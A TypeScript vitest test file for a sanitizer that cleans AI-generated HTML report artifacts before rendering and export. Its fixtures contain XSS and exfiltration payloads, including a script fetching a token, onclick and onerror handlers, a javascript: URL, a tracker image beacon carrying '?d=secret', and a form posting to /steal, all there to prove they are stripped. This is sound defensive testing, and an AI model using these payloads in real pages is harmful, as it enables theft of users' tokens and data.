import { describe, expect, it } from 'vitest';
import { MAX_HTML_LENGTH, parseArtifact } from './artifact.parser';

/**
 * The trust boundary's tests.
 *
 * These assert BEHAVIOUR at the seam — what survives, what is repaired, what is
 * refused, and that every repair is reported — not the regexes that implement it.
 * The sandbox is what makes model markup safe to render; this layer is what makes
 * the EXPORTED file safe and what makes a broken contract visible, so the tests
 * are written from those two purposes.
 */

const OPTIONS = { module: 'sales-order', moduleLabel: 'Sales Order' };

describe('parseArtifact', () => {
  it('keeps a conforming document intact', () => {
    const html = '<div class="rl-report"><style>.rl-report{color:#111}</style><h1>Backorders</h1></div>';

    const { artifact, issues } = parseArtifact({ title: 'Backorders', html }, OPTIONS);

    expect(artifact?.html).toBe(html);
    expect(issues).toEqual([]);
  });

  it('records the app-supplied metadata rather than anything the model sent', () => {
    const { artifact } = parseArtifact(
      { title: 'T', html: '<p>x</p>', metadata: { module: 'spoofed', generatedAt: '1999-01-01' } },
      { ...OPTIONS, provider: 'Claude', slice: 'dates from 2025-01-01 to 2025-03-31' },
    );

    expect(artifact?.metadata.module).toBe('sales-order');
    expect(artifact?.metadata.provider).toBe('Claude');
    expect(artifact?.metadata.slice).toBe('dates from 2025-01-01 to 2025-03-31');
    // A timestamp from the model would be a figure the model invented, and this
    // one is printed in the exported document's footer.
    expect(artifact?.metadata.generatedAt).not.toBe('1999-01-01');
    expect(Number.isNaN(Date.parse(artifact!.metadata.generatedAt))).toBe(false);
  });

  describe('repairs, each of which is reported', () => {
    it('removes a script element and its contents', () => {
      const { artifact, issues } = parseArtifact(
        { title: 'T', html: '<div><script>fetch("/api/token")</script><p>Kept</p></div>' },
        OPTIONS,
      );

      expect(artifact?.html).not.toContain('fetch');
      expect(artifact?.html).toContain('Kept');
      expect(issues.some((i) => i.includes('<script>'))).toBe(true);
    });

    it('removes inline event handlers', () => {
      const { artifact, issues } = parseArtifact(
        { title: 'T', html: '<div onclick="steal()" class="rl-report">Body</div>' },
        OPTIONS,
      );

      expect(artifact?.html).not.toContain('onclick');
      // The element and its other attributes survive — this is a repair, not a rejection.
      expect(artifact?.html).toContain('class="rl-report"');
      expect(artifact?.html).toContain('Body');
      expect(issues.some((i) => i.includes('event-handler'))).toBe(true);
    });

    it('neutralises a javascript: URL', () => {
      const { artifact, issues } = parseArtifact(
        { title: 'T', html: '<a href="javascript:alert(1)">Link</a>' },
        OPTIONS,
      );

      expect(artifact?.html).not.toContain('javascript:');
      expect(issues.some((i) => i.includes('javascript:'))).toBe(true);
    });

    it('strips a link to an external resource', () => {
      // A remote <img> is the exfiltration channel the sandbox alone does NOT
      // close — the request still leaves, and its URL is a channel. The
      // document's CSP blocks it at render time; this stops it travelling in the
      // exported file at all.
      const { artifact, issues } = parseArtifact(
        { title: 'T', html: '<img src="https://tracker.example/p.gif?d=secret" alt="">' },
        OPTIONS,
      );

      expect(artifact?.html).not.toContain('tracker.example');
      expect(issues.some((i) => i.includes('external resource'))).toBe(true);
    });

    it('strips a protocol-relative URL as well as an absolute one', () => {
      const { artifact } = parseArtifact(
        { title: 'T', html: '<img src="//tracker.example/p.gif">' },
        OPTIONS,
      );

      expect(artifact?.html).not.toContain('tracker.example');
    });

    it('removes an @import and an external css url()', () => {
      const { artifact, issues } = parseArtifact(
        {
          title: 'T',
          html: '<style>@import url("https://fonts.example/f.css"); .a{background:url(https://x.example/i.png)}</style><p>x</p>',
        },
        OPTIONS,
      );

      expect(artifact?.html).not.toContain('fonts.example');
      expect(artifact?.html).not.toContain('x.example');
      expect(issues.length).toBeGreaterThan(0);
    });

    it('removes a form tag but keeps what was inside it', () => {
      const { artifact } = parseArtifact(
        { title: 'T', html: '<form action="/steal"><p>Important figure</p></form>' },
        OPTIONS,
      );

      expect(artifact?.html).not.toContain('<form');
      expect(artifact?.html).toContain('Important figure');
    });

    it('removes HTML comments, which carry the model’s working notes', () => {
      // Observed live: chart arithmetic written into comments beside the SVG
      // coordinates. Invisible on screen, but present in every exported copy.
      const { artifact, issues } = parseArtifact(
        {
          title: 'T',
          html: '<svg><!-- 107.5 * 1.2 = 129px from the 240px baseline --><rect y="111"/></svg>',
        },
        OPTIONS,
      );

      expect(artifact?.html).not.toContain('129px');
      expect(artifact?.html).toContain('<rect y="111"/>');
      expect(issues.some((i) => i.includes('working notes'))).toBe(true);
    });

    it('reports unevaluated template placeholders without deleting the report', () => {
      // Observed live: Jinja-style expressions written into the html field, which
      // render as that literal text where the figure should be. There is no
      // honest repair — evaluating them means writing a template engine, deleting
      // them leaves holes — so the failure is named and the report still renders.
      const { artifact, issues } = parseArtifact(
        { title: 'T', html: `<p>{{ '{:,.0f}'.format(1261) }} transactions</p>` },
        OPTIONS,
      );

      expect(artifact).not.toBeNull();
      expect(artifact?.html).toContain('1261');
      expect(issues.some((i) => i.includes('template placeholders'))).toBe(true);
    });

    it('unwraps a whole document down to its body', () => {
      const { artifact, issues } = parseArtifact(
        {
          title: 'T',
          html: '<!doctype html><html><head><title>x</title></head><body><h1>Report</h1></body></html>',
        },
        OPTIONS,
      );

      expect(artifact?.html).toBe('<h1>Report</h1>');
      expect(issues.some((i) => i.includes('whole HTML page'))).toBe(true);
    });

    it('strips a markdown fence the model was told not to add', () => {
      const { artifact } = parseArtifact(
        { title: 'T', html: '```html\n<div>Report</div>\n```' },
        OPTIONS,
      );

      expect(artifact?.html).toBe('<div>Report</div>');
    });

    it('falls back to a placeholder title, and says so', () => {
      const { artifact, issues } = parseArtifact({ html: '<p>x</p>' }, OPTIONS);

      expect(artifact?.title).toBe('Untitled report');
      expect(issues.some((i) => i.includes('no title'))).toBe(true);
    });

    it('reduces a title containing markup to plain text', () => {
      const { artifact } = parseArtifact(
        { title: '<img src=x onerror=alert(1)>Sales', html: '<p>x</p>' },
        OPTIONS,
      );

      expect(artifact?.title).toBe('Sales');
    });
  });

  describe('refusals — the only two cases with nothing left to show', () => {
    it('refuses a reply with no html', () => {
      const { artifact, issues } = parseArtifact({ title: 'T' }, OPTIONS);

      expect(artifact).toBeNull();
      expect(issues[0]).toContain('no report document');
    });

    it('refuses a non-object', () => {
      expect(parseArtifact('a report', OPTIONS).artifact).toBeNull();
      expect(parseArtifact(null, OPTIONS).artifact).toBeNull();
      expect(parseArtifact(['x'], OPTIONS).artifact).toBeNull();
    });

    it('refuses a document that is nothing but forbidden content', () => {
      const { artifact, issues } = parseArtifact(
        { title: 'T', html: '<script>everything()</script>' },
        OPTIONS,
      );

      expect(artifact).toBeNull();
      expect(issues.at(-1)).toContain('Nothing was left');
    });

    it('refuses an oversized document rather than truncating it mid-tag', () => {
      const { artifact, issues } = parseArtifact(
        { title: 'T', html: `<p>${'x'.repeat(MAX_HTML_LENGTH)}</p>` },
        OPTIONS,
      );

      expect(artifact).toBeNull();
      expect(issues.at(-1)).toContain('over the');
    });
  });
});
